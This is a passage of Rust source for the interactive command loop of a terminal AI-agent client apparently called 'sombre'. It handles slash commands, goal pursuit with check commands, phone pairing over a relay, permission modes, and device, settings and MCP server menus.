use std::collections::{HashMap, VecDeque};
use std::io;
use std::path::{Path, PathBuf};
use std::process::ExitCode;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::{Duration, Instant};

use sombre_core::event::Event;
use sombre_core::{Agent, Model, Roots, Session, ago, here, now, scan, transcript};
use sombre_harness::config::{Config, LEVELS, Mode};

use crate::approve::{self, Choice};
use crate::carry;
use crate::dock::{Action, Dock, Draft};
use crate::provider;
use crate::relay::Reach;
use crate::size;
use crate::streak::Streak;
use crate::view;
use sombre_engine::goal::{self, Goal, Outcome};
use sombre_engine::shell;
use sombre_engine::{Engine, Next, about, covers, fallback, kept, recorded};

static TRUSTED: AtomicBool = AtomicBool::new(false);
static AIMING: AtomicBool = AtomicBool::new(false);

#[derive(Debug, PartialEq, Eq)]
pub enum Input {
    Send(String),
    Shell(String),
    Resume(bool),
    Status,
    Skills,
    Mcp,
    Settings,
    Device,
    Compact,
    Goal(String),
    New,
    Current,
    Switch(Agent),
    Model(Option<String>),
    Provider,
    Effort(Option<String>),
    Rename(String),
    Pair(String),
    Permissions(Option<String>),
    Help,
    Exit,
    Unknown(String),
    Empty,
}

fn elsewhere(input: &Input) -> Option<&'static str> {
    match input {
        Input::Model(None) => Some("send /model with a name, like /model opus"),
        Input::Effort(None) => Some("send /effort with a level: low, medium, high, xhigh, or max"),
        Input::Permissions(None) => Some("send /permissions ask or /permissions auto"),
        Input::Permissions(Some(mode)) if mode == "yolo" => {
            Some("yolo needs a yes on your computer, so turn it on there")
        }
        Input::Rename(name) if name.is_empty() => Some("send /rename with the new name"),
        Input::Resume(_) | Input::Settings | Input::Device | Input::Mcp | Input::Provider => {
            Some("that one opens a picker on your computer, so run it there")
        }
        Input::Pair(rest) if rest.is_empty() => {
            Some("this phone is already paired. /pair list shows your phones")
        }
        Input::Exit => {
            Some("/exit only works on your computer, so your phone can't leave sombre closed")
        }
        Input::Shell(_) => Some("shell commands only run from your computer, so type it there"),
        Input::Goal(objective) if !sombre_engine::goal::checks(objective).is_empty() => {
            Some("a goal with a `check` runs that command, so set it on your computer")
        }
        _ => None,
    }
}

pub fn parse(line: &str) -> Input {
    let line = line.trim();
    if line.is_empty() {
        return Input::Empty;
    }
    if let Some(command) = line.strip_prefix('!') {
        return Input::Shell(command.trim().to_string());
    }
    let Some(rest) = line.strip_prefix('/') else {
        return Input::Send(line.to_string());
    };
    if rest == "goal" || rest.starts_with("goal ") {
        return Input::Goal(rest[4..].trim().to_string());
    }
    if rest == "pair" || rest.starts_with("pair ") {
        return Input::Pair(rest[4..].trim().to_string());
    }
    if rest == "rename" || rest.starts_with("rename ") {
        return Input::Rename(rest[6..].trim().to_string());
    }
    let mut words = rest.split_whitespace();
    let first = words.next().unwrap_or_default();
    if first.contains('/') {
        return Input::Send(line.to_string());
    }
    match (first, words.next(), words.next()) {
        ("resume", None, None) => Input::Resume(false),
        ("resume", Some("all" | "--all"), None) => Input::Resume(true),
        ("status", None, None) => Input::Status,
        ("skills", None, None) => Input::Skills,
        ("mcp", None, None) => Input::Mcp,
        ("settings", None, None) => Input::Settings,
        ("device", None, None) => Input::Device,
        ("compact", None, None) => Input::Compact,
        ("new" | "clear", None, None) => Input::New,
        ("agent", None, None) => Input::Current,
        ("agent", Some("claude"), None) => Input::Switch(Agent::Claude),
        ("agent", Some("codex"), None) => Input::Switch(Agent::Codex),
        ("agent", Some("sombre"), None) => Input::Switch(Agent::Sombre),
        ("provider" | "providers", None, None) => Input::Provider,
        ("effort", None, None) => Input::Effort(None),
        ("effort", Some(level), None) => Input::Effort(Some(level.to_string())),
        ("permissions", None, None) => Input::Permissions(None),
        ("permissions", Some(mode), None) => Input::Permissions(Some(mode.to_string())),
        ("model", None, None) => Input::Model(None),
        ("model", Some(name), None) => Input::Model(Some(name.to_string())),
        ("help", None, None) => Input::Help,
        ("exit" | "quit", None, None) => Input::Exit,
        _ => Input::Unknown(line.to_string()),
    }
}

pub fn run(mut engine: Engine, history: &[Event], rest: Option<Session>) -> ExitCode {
    let stop = Arc::new(AtomicBool::new(false));
    let flag = Arc::clone(&stop);
    if ctrlc::set_handler(move || flag.store(true, Ordering::SeqCst)).is_err() {
        eprintln!("sombre: couldn't listen for ctrl-c");
        return ExitCode::FAILURE;
    }
    size::watch();
    sombre_harness::process::hangups();
    let roots = Roots::detect();
    let saved = roots
        .as_ref()
        .and_then(|roots| Config::load(&roots.sombre).ok())
        .unwrap_or_default();
    sombre_harness::power::awake(!saved.sleep);
    let _pin = crate::pane::start(!saved.scrollback);
    let mut models = names(roots.as_ref(), engine.agent);
    let mut composer = crate::compose::Composer::default();
    resumed(&mut engine, history, roots.as_ref());
    let shown = screen(&engine, history);
    if let Some(session) = rest {
        fill(session, shown);
    }
    current(&engine);
    if history.is_empty() {
        crate::title::set(&view::folder(&engine.cwd));
    }
    if engine.agent == Agent::Claude && sombre_core::claude::untrusted(&engine.cwd) {
        view::note(
            "this folder's .claude settings and hooks stay off until you open it in claude once and trust it",
        );
    }
    match crate::relay::resume() {
        Ok(true) => {
            for item in shared(&engine) {
                crate::relay::post(&item);
            }
            view::note("your paired phone follows this chat");
        }
        Ok(false) => {}
        Err(problem) => view::note(&problem),
    }
    let mut shell = false;
    let mut held: Vec<PathBuf> = Vec::new();
    let mut phoned: Vec<PathBuf> = Vec::new();
    let mut carried: Vec<PathBuf> = Vec::new();
    let mut queued = false;
    let mut leaving = false;
    if engine.mode == Mode::Yolo {
        TRUSTED.store(true, Ordering::Relaxed);
    }
    let mut pending: VecDeque<String> = VecDeque::new();
    let mut draft = String::new();
    let mut notes: Vec<String> = Vec::new();
    let mut target: Option<Goal> = None;
    let mut next: Option<Input> = None;
    let mut teeing = false;
    loop {
        if std::mem::take(&mut teeing)
            && let Some(text) = view::untee()
        {
            crate::relay::post(&serde_json::json!({"kind": "printed", "text": text}));
        }
        let mut phone = false;
        let input = if let Some(input) = next.take() {
            input
        } else {
            queued = !pending.is_empty();
            let line = if let Some(next) = pending.pop_front() {
                view::typed(false, &next);
                next
            } else if let Some(held) = crate::relay::held() {
                phone = true;
                view::typed(false, &held);
                held
            } else {
                if view::resized() {
                    print!("{}", view::replay(None));
                }
                if !draft.is_empty() {
                    composer.set(&std::mem::take(&mut draft));
                }
                let mut grab = || {
                    let root = roots.as_ref()?.sombre.join("images");
                    let path = root.join(format!("{}.png", sombre_core::clock::uuid()));
                    std::fs::create_dir_all(&root).ok()?;
                    crate::clipboard::image(&path).ok()?;
                    held.push(path);
                    Some(format!("[Image #{}]", held.len()))
                };
                let ready = footer(&engine);
                let bell = engine.bell();
                let mut unsaved = None;
                let mut turn = || {
                    let next = upcoming(&engine)?;
                    engine.shift(next);
                    unsaved = save(roots.as_ref(), next).err();
                    Some(footer(&engine))
                };
                let read = crate::compose::read(
                    &mut composer,
                    &mut shell,
                    &models,
                    &ready,
                    &mut grab,
                    &mut turn,
                    &|| bell.load(Ordering::SeqCst) > 0,
                );
                if let Some(problem) = unsaved {
                    view::failed(&problem);
                }
                match read {
                    crate::compose::Read::Line(line) if shell => {
                        shell = false;
                        format!("!{line}")
                    }
                    crate::compose::Read::Remote(line, images) => {
                        phone = true;
                        phoned = images;
                        line
                    }
                    crate::compose::Read::Line(line) => line,
                    crate::compose::Read::Interrupted if leaving => break,
                    crate::compose::Read::Interrupted => {
                        leaving = true;
                        held.clear();
                        view::note("press ctrl-c again to exit");
                        continue;
                    }
                    crate::compose::Read::Stale => continue,
                    crate::compose::Read::Cycle => {
                        cycle(&mut engine, roots.as_ref());
                        continue;
                    }
                    crate::compose::Read::Woke => {
                        wake(
                            &mut engine,
                            &stop,
                            Kept {
                                carried: &mut carried,
                                composer: &mut composer,
                                draft: &mut draft,
                                held: &mut held,
                                pending: &mut pending,
                            },
                        );
                        continue;
                    }
                    crate::compose::Read::Eof => break,
                }
            };
            leaving = false;
            let input = parse(&line);
            if !matches!(input, Input::Send(_)) {
                phoned.clear();
            }
            if phone && !matches!(input, Input::Send(_) | Input::Empty) {
                crate::relay::post(
                    &serde_json::json!({"command": true, "kind": "user", "text": line.trim()}),
                );
                if let Some(hint) = elsewhere(&input) {
                    view::note(hint);
                    crate::relay::post(&serde_json::json!({"kind": "note", "text": hint}));
                    continue;
                }
                view::tee();
                teeing = true;
            }
            input
        };
        match input {
            Input::Empty => {}
            Input::Send(text) => {
                view::line("");
                let pasted = if !phoned.is_empty() {
                    std::mem::take(&mut phoned)
                } else if queued {
                    carried.clone()
                } else {
                    std::mem::take(&mut held)
                };
                let text = match roots.as_ref() {
                    Some(roots) => {
                        let (text, images, problems) =
                            crate::attach::gather(&text, pasted, &roots.sombre);
                        for problem in problems {
                            view::note(&problem);
                        }
                        engine.images = images;
                        text
                    }
                    None => text,
                };
                let text = shell::attach(&text, &notes);
                if engine.woke() {
                    wake(
                        &mut engine,
                        &stop,
                        Kept {
                            carried: &mut carried,
                            composer: &mut composer,
                            draft: &mut draft,
                            held: &mut held,
                            pending: &mut pending,
                        },
                    );
                }
                crate::relay::said(&text, &engine.images);
                notes.clear();
                if engine.session.is_none() {
                    crate::title::set(&text);
                }
                let (left, _) = turn(&mut engine, &text, &stop);
                current(&engine);
                carried = absorb(left, &mut pending, &mut draft, &mut held);
            }
            Input::Shell(command) if command.is_empty() => {
                view::note("type a command after !, like !ls or !git status");
            }
            Input::Shell(command) => {
                if let Some(note) = command_line(&command, &engine.cwd, &stop) {
                    notes.push(note);
                }
            }
            Input::Goal(text) => {
                let left = match goal::parse(&text) {
                    goal::Command::Show => {
                        show(target.as_ref());
                        None
                    }
                    goal::Command::Clear => {
                        if target.take().is_none() {
                            view::note("there's no goal to clear");
                        } else if engine.agent == Agent::Claude {
                            let _ = turn(&mut engine, "/goal clear", &stop);
                        } else if engine.native()
                            && let Err(error) = engine.unaim()
                        {
                            view::failed(&format!("couldn't clear codex's goal: {error}"));
                        } else {
                            view::note("goal cleared");
                        }
                        None
                    }
                    goal::Command::Pause => {
                        if let Some(current) = target.as_mut() {
                            current.status = goal::Status::Paused;
                            view::note(&current.summary());
                        }
                        None
                    }
                    goal::Command::Resume => match target.as_mut() {
                        Some(current) if current.status != goal::Status::Complete => {
                            current.status = goal::Status::Active;
                            current.idle = 0;
                            if current.turns >= goal::TURNS {
                                current.turns = 0;
                            }
                            Some(pursue(&mut engine, current, &stop, false))
                        }
                        Some(_) => {
                            view::note(
                                "that goal is already achieved. /goal <what done looks like> sets a new one",
                            );
                            None
                        }
                        None => {
                            view::note(
                                "there's no goal to resume. /goal <what done looks like> starts one",
                            );
                            None
                        }
                    },
                    goal::Command::Set(objective) => {
                        let mut current = Goal::new(objective);
                        let left = pursue(&mut engine, &mut current, &stop, true);
                        target = Some(current);
                        Some(left)
                    }
                };
                if let Some(left) = left {
                    carried = absorb(left, &mut pending, &mut draft, &mut held);
                }
            }
            Input::Status => status(&engine, roots.as_ref()),
            Input::Skills => skills(&engine),
            Input::Settings => {
                if let Some(roots) = roots.as_ref() {
                    next = settings(&engine, roots);
                }
            }
            Input::Device => {
                if let Some(roots) = roots.as_ref() {
                    device(roots);
                }
            }
            Input::Mcp => {
                if let Some(roots) = roots.as_ref()
                    && servers(&engine, roots)
                {
                    engine.reconnect();
                }
            }
            Input::Compact => match engine.compact() {
                Ok(true) => {
                    view::line("");
                    let (left, _) = watch(&mut engine, &stop, false);
                    carried = absorb(left, &mut pending, &mut draft, &mut held);
                    engine.left = None;
                }
                Ok(false) => view::note("this codex compacts on its own when it needs to"),
                Err(error) => view::failed(&format!("couldn't compact: {error}")),
            },
            Input::Resume(all) => {
                let Some(roots) = roots.as_ref() else {
                    view::failed("couldn't find your home folder, so agent history can't be found");
                    continue;
                };
                let sessions = scan(roots);
                if let Some(session) = pick(&sessions, &engine.cwd, all)
                    && let Some(next) = open(session)
                {
                    let (history, whole) = sombre_core::recent(session, view::RECENT);
                    engine = next;
                    resumed(&mut engine, &history, Some(roots));
                    models = names(Some(roots), engine.agent);
                    view::wipe();
                    let shown = screen(&engine, &history);
                    if !whole {
                        fill(session.clone(), shown);
                    }
                    view::note(&format!("back in {}", session.title));
                    crate::title::set(&session.title);
                }
            }
            Input::New => {
                engine.stop();
                engine.session = None;
                view::wipe();
                let _ = screen(&engine, &[]);
                crate::title::set(&view::folder(&engine.cwd));
            }
            Input::Current => view::note(&format!(
                "using {}. /agent claude, /agent codex, or /agent sombre switches",
                engine.name()
            )),
            Input::Switch(agent) => {
                switch(&mut engine, &mut models, roots.as_ref(), agent, None);
            }
            Input::Model(Some(name)) => model(&mut engine, roots.as_ref(), name),
            Input::Model(None) => {
                if let Some(name) = roots.as_ref().and_then(|roots| choose(roots, &engine)) {
                    model(&mut engine, roots.as_ref(), name);
                }
            }
            Input::Provider => {
                let Some(roots) = roots.as_ref() else {
                    continue;
                };
                let current = engine
                    .model
                    .clone()
                    .or_else(|| fallback(Some(roots), engine.agent));
                let Some(target) = provider::pick(
                    roots,
                    Some(provider::active(engine.agent, current.as_deref())),
                ) else {
                    continue;
                };
                provider::remember(roots, &target);
                if engine.agent == Agent::Sombre
                    && target.agent == Agent::Sombre
                    && let Some(name) = target.model
                {
                    model(&mut engine, Some(roots), name);
                } else {
                    switch(
                        &mut engine,
                        &mut models,
                        Some(roots),
                        target.agent,
                        target.model,
                    );
                }
            }
            Input::Permissions(text) => {
                let picked = match text {
                    Some(text) => {
                        let Some(mode) = Mode::parse(&text) else {
                            view::note(&format!("{text} isn't a mode. try ask, auto, or yolo"));
                            continue;
                        };
                        Some(mode)
                    }
                    None => permissions(&engine),
                };
                if let Some(mode) = picked.filter(|mode| *mode != Mode::Yolo || trust()) {
                    allow(&mut engine, roots.as_ref(), mode);
                }
            }
            Input::Effort(text) => {
                let picked = match text {
                    Some(text) if text == "default" => Some(None),
                    Some(text) if LEVELS.contains(&text.as_str()) => Some(Some(text)),
                    Some(text) => {
                        view::note(&format!(
                            "{text} isn't an effort level. try {} or default",
                            engine.levels().join(", ")
                        ));
                        continue;
                    }
                    None => effort(&engine),
                };
                if let Some(picked) = picked {
                    strive(&mut engine, roots.as_ref(), picked);
                }
            }
            Input::Rename(text) => {
                let typed = if text.is_empty() {
                    crate::menu::input("name this chat")
                        .placeholder("deploy fix")
                        .interact()
                        .ok()
                } else {
                    Some(text)
                };
                if let Some(typed) = typed {
                    match sombre_core::named(&typed) {
                        Ok(name) => match engine.rename(&name) {
                            Ok(()) => {
                                crate::title::set(&name);
                                view::note(&format!("renamed to {name}"));
                            }
                            Err(problem) => view::failed(&problem),
                        },
                        Err(problem) => view::note(problem),
                    }
                }
            }
            Input::Pair(command) => pair(&engine, roots.as_ref(), &command),
            Input::Help => view::help(),
            Input::Exit => break,
            Input::Unknown(text) => view::note(&match crate::complete::closest(&text) {
                Some(command) => format!("{text} isn't a command. did you mean {command}?"),
                None => format!("{text} isn't a command. /help lists them"),
            }),
        }
    }
    crate::title::reset();
    ExitCode::SUCCESS
}

pub fn pick<'a>(sessions: &'a [Session], cwd: &Path, all: bool) -> Option<&'a Session> {
    let local: Vec<&Session> = if all {
        sessions.iter().collect()
    } else {
        here(sessions, cwd)
    };
    if local.is_empty() {
        view::note(if all {
            "no chats yet from claude code, codex, or sombre"
        } else {
            "no chats in this folder yet. /resume all shows every folder"
        });
        return None;
    }
    let time = now();
    let title = if all {
        "resume any chat"
    } else {
        "resume a chat from this folder"
    };
    let choice = local
        .iter()
        .enumerate()
        .fold(crate::menu::select(title), |menu, (index, session)| {
            let place = if all {
                format!("  {}", view::folder(&session.cwd))
            } else {
                String::new()
            };
            let last = sombre_core::latest(session)
                .filter(|latest| *latest != session.title)
                .map(|latest| format!("  last: {latest}"))
                .unwrap_or_default();
            menu.item(
                index,
                &session.title,
                format!(
                    "{}{place}  {}{last}",
                    session.agent.name(),
                    ago(session.updated, time)
                ),
            )
        })
        .filter_mode()
        .max_rows(10)
        .interact()
        .ok()?;
    local.get(choice).copied()
}

fn command_line(command: &str, cwd: &Path, stop: &AtomicBool) -> Option<String> {
    view::line("");
    view::step("Run", command, cwd);
    let ran = shell::run(command, cwd, stop, false, |line| {
        view::line(&format!("    {line}"));
    });
    match ran {
        Ok(ran) => {
            match (ran.stopped, ran.code) {
                (true, _) => view::note("stopped"),
                (false, Some(0)) => view::note("the agent sees this with your next message"),
                (false, Some(code)) => view::failed(&format!(
                    "exit code {code}. the agent sees this with your next message"
                )),
                (false, None) => view::failed("the command was killed"),
            }
            Some(shell::note(command, &ran))
        }
        Err(problem) => {
            view::failed(&problem);
            None
        }
    }
}

fn show(current: Option<&Goal>) {
    let Some(current) = current else {
        view::note(
            "no goal yet. /goal <what done looks like> starts one, like /goal all tests pass",
        );
        return;
    };
    view::table(&[
        ("goal", current.objective.clone()),
        ("status", current.word().to_string()),
        ("turns", format!("{} of {}", current.turns, goal::TURNS)),
        ("time", goal::elapsed(current.started.elapsed())),
    ]);
}

fn verify(
    objective: &str,
    cwd: &Path,
    stop: &AtomicBool,
    fenced: bool,
) -> Option<(String, String)> {
    for command in goal::checks(objective) {
        view::line("");
        view::step("Test", &command, cwd);
        match shell::run(&command, cwd, stop, fenced, |_| {}) {
            Ok(ran) if ran.code == Some(0) && !ran.stopped => {
                let shown = if ran.output.trim().is_empty() {
                    "passed"
                } else {
                    ran.output.as_str()
                };
                view::output(shown, false);
            }
            Ok(ran) => {
                view::output(&ran.output, true);
                return Some((command, ran.output));
            }
            Err(problem) => return Some((command, problem)),
        }
    }
    None
}

fn pursue(engine: &mut Engine, current: &mut Goal, stop: &AtomicBool, first: bool) -> Draft {
    AIMING.store(true, Ordering::SeqCst);
    let left = chase(engine, current, stop, first);
    AIMING.store(false, Ordering::SeqCst);
    left
}

fn progress(current: &Goal, stopped: bool) -> String {
    if stopped {
        format!("stopped. {}", current.summary())
    } else {
        current.summary()
    }
}

fn chase(engine: &mut Engine, current: &mut Goal, stop: &AtomicBool, first: bool) -> Draft {
    view::line("");
    if engine.native() {
        let (left, outcome) = if engine.agent == Agent::Claude {
            turn(engine, &format!("/goal {}", current.objective), stop)
        } else {
            begin(engine, stop, false, |engine| engine.aim(&current.objective))
        };
        if outcome.refused {
            engine.pause();
        }
        current.turns += engine.rounds().min(goal::TURNS);
        let objective = current.objective.clone();
        current.native(&outcome, || {
            verify(&objective, &engine.cwd, stop, engine.mode != Mode::Yolo)
                .map(|(command, _)| command)
        });
        if outcome.limited && engine.agent == Agent::Claude {
            let _ = turn(engine, "/goal clear", stop);
        }
        view::note(&progress(current, outcome.stopped));
        return left;
    }
    engine.goal = Some(current.objective.clone());
    let mut prompt = if first {
        goal::opening(&current.objective)
    } else {
        goal::onward(&current.objective)
    };
    loop {
        let (left, outcome) = turn(engine, &prompt, stop);
        current.turns += 1;
        current.judge(&outcome);
        if current.status == goal::Status::Complete
            && let Some((command, output)) = verify(
                &current.objective,
                &engine.cwd,
                stop,
                engine.mode != Mode::Yolo,
            )
        {
            current.status = goal::Status::Active;
            prompt = goal::retry(&command, &output, &current.objective);
            view::note(&format!("`{command}` failed, so the goal isn't done yet"));
            if current.turns < goal::TURNS {
                continue;
            }
            current.status = goal::Status::Limit;
        }
        if current.status != goal::Status::Active {
            engine.goal = None;
            if current.started.elapsed() >= Duration::from_secs(15) {
                view::notify(&current.summary());
            }
            view::note(&progress(current, outcome.stopped));
            return left;
        }
        let nudge = goal::onward(&current.objective);
        prompt = if left.queued.is_empty() {
            nudge
        } else {
            format!("{}\n\n{nudge}", left.queued.join("\n\n"))
        };
        view::note(&current.summary());
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Part {
    Awake,
    Lid,
    Power,
    Phone,
}

fn device(roots: &Roots) {
    use sombre_harness::power::{self, Lid};
    let mark = roots.sombre.join("lid");
    let mut last = Part::Awake;
    loop {
        let mut config = Config::load(&roots.sombre).unwrap_or_default();
        let lid = power::lid(&mark);
        let phones = crate::relay::devices().len();
        let rows = [
            (
                Part::Awake,
                "stay awake",
                if power::awakened() {
                    "while sombre is open"
                } else {
                    "off"
                }
                .to_string(),
                "keeps this computer from sleeping on its own while sombre is open. tab switches it",
            ),
            (
                Part::Lid,
                "lid closed",
                match lid {
                    Lid::Sleeps => "sleeps",
                    Lid::Running => "keeps running",
                    Lid::Stuck => "stuck on",
                    Lid::Missing => "not on this system",
                }
                .to_string(),
                match lid {
                    Lid::Sleeps if cfg!(target_os = "macos") => {
                        "keeps running with the lid shut. asks for your password once. keep it plugged in"
                    }
                    Lid::Sleeps if cfg!(windows) => {
                        "keeps running with the lid shut. asks for administrator approval once. keep it plugged in"
                    }
                    Lid::Sleeps => {
                        "keeps running with the lid shut while sombre is open. keep it plugged in"
                    }
                    Lid::Running => {
                        "turns itself off when sombre quits or the battery drops below 20%. tab switches it"
                    }
                    Lid::Stuck => {
                        "lid sleep is still off from an earlier run. tab turns it back on"
                    }
                    Lid::Missing => "this computer has no lid setting sombre can change",
                },
            ),
            (
                Part::Power,
                "power",
                power::battery().unwrap_or_else(|| "no battery".to_string()),
                "how this computer is powered right now",
            ),
            (
                Part::Phone,
                "phone",
                match phones {
                    0 => "none paired".to_string(),
                    1 => "1 paired".to_string(),
                    count => format!("{count} paired"),
                },
                "/pair connects one. /pair list shows them",
            ),
        ];
        let widest = rows.iter().map(|row| row.1.len()).max().unwrap_or(0);
        let Ok(picked) = rows
            .iter()
            .fold(
                crate::menu::select("device"),
                |menu, (part, name, value, hint)| {
                    menu.item(
                        *part,
                        format!("{}  {}", view::pad(name, widest), view::dim(value)),
                        *hint,
                    )
                },
            )
            .initial_value(last)
            .quiet()
            .interact()
        else {
            return;
        };
        last = picked;
        match picked {
            Part::Awake => {
                config.sleep = power::awakened();
                if let Err(error) = config.save(&roots.sombre) {
                    view::failed(&format!("couldn't save the setting: {error}"));
                    return;
                }
                power::awake(!config.sleep);
            }
            Part::Lid => {
                crate::pane::release();
                let done = match lid {
                    Lid::Sleeps => {
                        if cfg!(target_os = "macos") {
                            println!(
                                "  sombre needs your mac password to keep it running with the lid closed"
                            );
                        } else if cfg!(windows) {
                            println!(
                                "  sombre needs administrator approval to keep it running with the lid closed"
                            );
                        }
                        power::hold(&mark)
                    }
                    Lid::Running | Lid::Stuck => power::free(&mark),
                    Lid::Missing => Ok(()),
                };
                if let Err(problem) = done {
                    view::failed(&problem);
                }
            }
            Part::Power | Part::Phone => {}
        }
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Setting {
    Agent,
    Model,
    Permissions,
    Effort,
    Working,
    Screen,
    Phone,
    Publish,
    Mcp,
}

fn settings(engine: &Engine, roots: &Roots) -> Option<Input> {
    let mut last = Setting::Agent;
    loop {
        let mut config = match Config::load(&roots.sombre) {
            Ok(config) => config,
            Err(problem) => {
                view::failed(&problem);
                return None;
            }
        };
        let servers = match config.mcp.len() {
            0 => "none".to_string(),
            1 => "1 server".to_string(),
            count => format!("{count} servers"),
        };
        let rows = [
            (
                Setting::Agent,
                "agent",
                engine.name().to_string(),
                "which agent and provider this chat uses",
            ),
            (
                Setting::Model,
                "model",
                engine
                    .label
                    .clone()
                    .unwrap_or_else(|| "default".to_string()),
                "the model this agent uses",
            ),
            (
                Setting::Permissions,
                "permissions",
                engine.mode.name().to_string(),
                about(engine.agent, engine.mode),
            ),
            (
                Setting::Effort,
                "effort",
                engine.level().unwrap_or("default").to_string(),
                "how hard the model thinks before it answers",
            ),
            (
                Setting::Working,
                "while working",
                if config.steer { "steer" } else { "queue" }.to_string(),
                if config.steer {
                    "enter sends a message into the running turn, tab queues it. enter switches it"
                } else {
                    "enter queues a message for after the turn, tab sends it now. enter switches it"
                },
            ),
            (
                Setting::Screen,
                "screen",
                if config.scrollback {
                    "scrollback"
                } else {
                    "full"
                }
                .to_string(),
                if config.scrollback {
                    "history lives in the terminal's own scrollback and the input scrolls with it. enter switches it"
                } else {
                    "the input stays at the bottom and the wheel scrolls the chat. drag to copy. enter switches it"
                },
            ),
            (
                Setting::Phone,
                "phone",
                match reached(&config) {
                    Reach::Hosted | Reach::Wifi => "sombre's relay".to_string(),
                    Reach::Tailnet => "tailscale".to_string(),
                    Reach::Relay => config.relay.clone().unwrap_or_default(),
                },
                "how /pair reaches your phone when you pick anywhere. home network is always there too",
            ),
            (
                Setting::Publish,
                "publish",
                if config.publish { "on" } else { "off" }.to_string(),
                "list sombre's claude code chats in claude --resume. codex lists them on its own. enter switches it",
            ),
            (
                Setting::Mcp,
                "mcp",
                servers,
                "mcp servers for sombre's agent",
            ),
        ];
        let widest = rows.iter().map(|row| row.1.len()).max().unwrap_or(0);
        let picked = rows
            .iter()
            .fold(
                crate::menu::select("settings"),
                |menu, (setting, name, value, hint)| {
                    menu.item(
                        *setting,
                        format!("{}  {}", view::pad(name, widest), view::dim(value)),
                        *hint,
                    )
                },
            )
            .initial_value(last)
            .quiet()
            .interact()
            .ok()?;
        last = picked;
        return Some(match picked {
            Setting::Agent => Input::Provider,
            Setting::Model => Input::Model(None),
            Setting::Permissions => Input::Permissions(None),
            Setting::Effort => Input::Effort(None),
            Setting::Mcp => Input::Mcp,
            Setting::Phone => {
                if !phone(&mut config) {
                    continue;
                }
                if let Err(error) = config.save(&roots.sombre) {
                    view::failed(&format!("couldn't save the setting: {error}"));
                    return None;
                }
                if config.tailscale && crate::relay::tailnet().is_none() {
                    view::note(
                        "tailscale isn't connected on this computer right now. /pair works once it is",
                    );
                }
                if crate::relay::paired() {
                    view::note(
                        "this is used the next time you run /pair. /pair off stops the current one",
                    );
                }
                continue;
            }
            Setting::Working => {
                config.steer = !config.steer;
                if let Err(error) = config.save(&roots.sombre) {
                    view::failed(&format!("couldn't save the setting: {error}"));
                    return None;
                }
                continue;
            }
            Setting::Screen => {
                config.scrollback = !config.scrollback;
                if let Err(error) = config.save(&roots.sombre) {
                    view::failed(&format!("couldn't save the setting: {error}"));
                    return None;
                }
                crate::pane::switch(!config.scrollback);
                continue;
            }
            Setting::Publish => {
                config.publish = !config.publish;
                if let Err(error) = config.save(&roots.sombre) {
                    view::failed(&format!("couldn't save the setting: {error}"));
                    return None;
                }
                continue;
            }
        });
    }
}

fn reached(config: &Config) -> Reach {
    Reach::preferred(config)
}

fn way(config: &Config) -> Option<Reach> {
    let anywhere = reached(config);
    crate::menu::select("where will your phone be?")
        .item(
            anywhere,
            "anywhere",
            match anywhere {
                Reach::Tailnet => "over tailscale, on both devices",
                Reach::Relay => "through your own relay",
                Reach::Hosted | Reach::Wifi => "via sombre's relay, sealed end to end",
            },
        )
        .item(
            Reach::Wifi,
            "home network",
            "only on a wi-fi you trust, since the page goes over plain http",
        )
        .initial_value(anywhere)
        .interact()
        .ok()
}

fn phone(config: &mut Config) -> bool {
    let Ok(picked) = crate::menu::select("how should /pair reach your phone from anywhere?")
        .item(
            Reach::Hosted,
            "sombre's relay",
            "no setup, sealed end to end",
        )
        .item(Reach::Tailnet, "tailscale", "both on the same tailnet")
        .item(Reach::Relay, "your own relay", "a sombre relay you run")
        .initial_value(reached(config))
        .interact()
    else {
        return false;
    };
    match picked {
        Reach::Hosted | Reach::Wifi => {
            config.tailscale = false;
            config.relay = None;
        }
        Reach::Tailnet => config.tailscale = true,
        Reach::Relay => {
            let Ok(typed) = crate::menu::input("relay url")
                .placeholder("https://relay.example.com")
                .default_input(config.relay.as_deref().unwrap_or_default())
                .validate(|url: &String| {
                    if url.starts_with("https://") || url.starts_with("http://") {
                        Ok(())
                    } else {
                        Err("start with https:// or http://")
                    }
                })
                .interact()
            else {
                return false;
            };
            config.tailscale = false;
            config.relay = Some(typed.trim_end_matches('/').to_string());
        }
    }
    true
}

fn skills(engine: &Engine) {
    let found = sombre_harness::skills::find(&engine.cwd);
    if found.is_empty() {
        view::note(
            "no skills yet. add a folder with a SKILL.md to .sombre/skills, .claude/skills, or .agents/skills",
        );
        return;
    }
    let rows: Vec<(&str, String)> = found
        .iter()
        .map(|skill| {
            (
                skill.name.as_str(),
                view::fit(&skill.about, view::width().saturating_sub(20)),
            )
        })
        .collect();
    view::table(&rows);
    if engine.agent != Agent::Sombre {
        view::note(&format!(
            "{} uses its own skills. these are what sombre's agent sees",
            engine.name()
        ));
    }
}

fn servers(engine: &Engine, roots: &Roots) -> bool {
    let mut config = match Config::load(&roots.sombre) {
        Ok(config) => config,
        Err(problem) => {
            view::failed(&problem);
            return false;
        }
    };
    if engine.agent != Agent::Sombre {
        view::note(&format!(
            "{} uses its own mcp servers. these are for sombre's agent",
            engine.name()
        ));
    }
    let shown: Vec<(&str, String)> = config
        .mcp
        .iter()
        .map(|(name, server)| {
            let what = server.url.clone().unwrap_or_else(|| {
                std::iter::once(server.command.clone().unwrap_or_default())
                    .chain(server.args.iter().cloned())
                    .collect::<Vec<_>>()
                    .join(" ")
            });
            (
                name.as_str(),
                view::fit(&what, view::width().saturating_sub(20)),
            )
        })
        .collect();
    if !shown.is_empty() {
        view::table(&shown);
    }
    let offered: Vec<(&str, String, sombre_harness::mcp::Server)> = sombre_harness::mcp::foreign()
        .into_iter()
        .filter(|(_, name, _)| !config.mcp.contains_key(name))
        .collect();
    if offered.is_empty() {
        if shown.is_empty() {
            view::note(&format!(
                "no mcp servers yet. add [mcp.name] with command and args, or url, to {}",
                view::home(&sombre_harness::config::file(&roots.sombre))
            ));
        }
        return false;
    }
    let picked = offered
        .iter()
        .enumerate()
        .fold(
            crate::menu::multiselect("add servers you already use in other agents?")
                .required(false),
            |menu, (index, (from, name, server))| {
                let what = server
                    .url
                    .clone()
                    .or_else(|| server.command.clone())
                    .unwrap_or_default();
                menu.item(index, name, format!("from {from}: {what}"))
            },
        )
        .interact()
        .unwrap_or_default();
    if picked.is_empty() {
        return false;
    }
    for index in &picked {
        if let Some((_, name, server)) = offered.get(*index) {
